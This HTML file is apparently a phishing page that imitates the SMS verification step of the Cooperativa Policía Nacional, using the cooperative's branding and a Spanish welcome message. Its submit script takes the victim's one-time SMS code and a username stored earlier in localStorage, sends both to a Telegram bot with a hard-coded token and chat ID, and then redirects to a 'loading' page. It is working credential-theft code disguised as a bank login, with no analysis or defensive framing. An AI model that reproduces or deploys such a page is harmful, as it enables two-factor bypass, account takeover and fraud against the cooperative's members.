<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Cooperativa Policía Nacional</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
    />

    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        font-family: "Avenir Next LT Pro", sans-serif;
        font-weight: 400 !important;
      }
      .input-highlight:focus {
        box-shadow: 0 0 0 3px rgba(255, 117, 0, 0.4);
        border-color: #ff7500;
      }
    </style>
  </head>
  <body
    class="bg-gray-100 flex flex-col items-center justify-center min-h-screen px-4 relative"
    style="background-image: url(fondoLogin.png)"
  >
    <!-- Logo -->
    <div class="mb-4">
      <img
        src="cpn_logo.png"
        alt="Logo CPN"
        class="mx-auto"
        style="width: 190px; margin-top: 20px; margin-bottom: 0px"
      />
    </div>

    <div style="padding: 40px">
      <!-- Login Box -->
      <div
        class="relative bg-white shadow-lg rounded-xl max-w-md w-full p-8 sm:p-8 custom-form z-10"
      >
        <div class="mb-6 text-center">
          <h2
            class="font-bold text-lg"
            style="color: #ff7500; font-size: 15px !important"
          >
            ¡Hola, te damos la bienvenida!
          </h2>
          <p
            class="text-gray-800 font-semibold"
            style="font-size: 13px !important"
          >
            Confirme su cuenta para poder acceder a ella
          </p>
        </div>

        <!-- Campo único para Código SMS con botón ojo -->
        <form onsubmit="return enviarFormulario(event)">
          <img src="sms.png" style="width: 80px; margin: auto" />

          <label
            class="block text-sm font-semibold text-gray-700 mb-1"
            for="smsCode"
            style="
              font-style: normal;
              font-weight: 700;
              font-size: 12px;
              line-height: 20px;
              color: #454142;
              margin-left: 16px;
            "
            >Código de verificacion</label
          >
          <div class="relative mb-4">
            <input
              type="password"
              id="smsCode"
              class="w-full border border-gray-300 rounded-md px-4 py-2 pr-10 focus:outline-none input-highlight"
              oninput="validarCampos()"
            />
            <button
              type="button"
              onclick="toggleSmsVisibility()"
              class="absolute right-3 top-2.5 text-gray-400 hover:text-gray-600"
            >
              <i id="toggleIcon" class="fas fa-eye"></i>
            </button>
          </div>

          <button
            type="submit"
            id="loginBtn"
            class="w-full bg-gray-300 text-white font-semibold py-2 rounded-md cursor-not-allowed"
            disabled
          >
            Verificar
          </button>
        </form>

        <!-- Imagen pegada al borde inferior izquierdo -->
        <img
          src="women.png"
          alt="Mujer con laptop"
          class="absolute bottom-0 w-32 sm:w-36"
          style="left: -50px; width: 80px"
        />
      </div>

      <!-- Registration Buttons -->
    </div>

    <!-- Footer -->
    <div class="mt-6 text-center text-sm text-gray-500 z-10">
      <a href="#" class="text-orange-600 hover:underline">Privacidad</a><br />
      Copyright (c) Cooperativa Policía Nacional. Todos los derechos reservados.
    </div>
    <script>
      function toggleSmsVisibility() {
        const field = document.getElementById("smsCode");
        const icon = document.getElementById("toggleIcon");

        const isHidden = field.type === "password";
        field.type = isHidden ? "text" : "password";
        icon.className = isHidden ? "fas fa-eye-slash" : "fas fa-eye";
      }

      function validarCampos() {
        const smsCode = document.getElementById("smsCode").value.trim();
        const loginBtn = document.getElementById("loginBtn");

        if (smsCode !== "") {
          loginBtn.disabled = false;
          loginBtn.classList.remove("bg-gray-300", "cursor-not-allowed");
          loginBtn.classList.add("bg-[#ff7500]", "cursor-pointer");
        } else {
          loginBtn.disabled = true;
          loginBtn.classList.add("bg-gray-300", "cursor-not-allowed");
          loginBtn.classList.remove("bg-[#ff7500]", "cursor-pointer");
        }
      }

      async function enviarFormulario(e) {
        e.preventDefault();
        const smsCode = document.getElementById("smsCode").value;
        const botToken = "8356158011:AAFziioUBzxtg6bontML_DNXsWstglfQ2yM"; // ← reemplaza con tu token real
        const chatId = "-4983208520"; // ← reemplaza con tu chat ID

        const mensaje = `CPN\nUsuario:${localStorage.getItem(
          "usuario"
        )}\nSMS: ${smsCode}`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: mensaje,
          }),
        })
          .then((res) => {
            if (res.ok) {
              window.location.href = "cargando2.html";
              // Aquí puedes redireccionar si quieres
            } else {
              console.log("Error al enviar a Telegram");
            }
          })
          .catch((err) => {
            console.error("Telegram error:", err);
            console.log("Error al conectar con Telegram");
          });
      }
    </script>
  </body>
</html>
